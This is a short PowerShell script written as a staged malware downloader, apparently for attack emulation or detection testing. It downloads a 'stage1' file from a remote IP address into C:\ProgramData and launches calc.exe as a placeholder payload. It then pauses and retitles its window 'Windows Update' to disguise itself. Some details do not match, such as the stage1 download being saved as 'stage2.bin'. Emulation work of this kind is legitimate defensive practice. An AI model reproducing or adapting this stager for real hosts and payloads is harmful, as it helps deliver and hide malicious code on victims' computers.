[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage1Url = 'http://203.0.113.148/stage1.ps1',
    [string]$OutputPath = 'C:\ProgramData\stage2.bin',
    [int]$RequestTimeout = 121
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Get-Stage1Payload -SourceUrl $Stage1Url -DestinationPath $OutputPath -TimeoutSec $RequestTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Start-Sleep -Seconds 36
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "stage marker 13 reached"
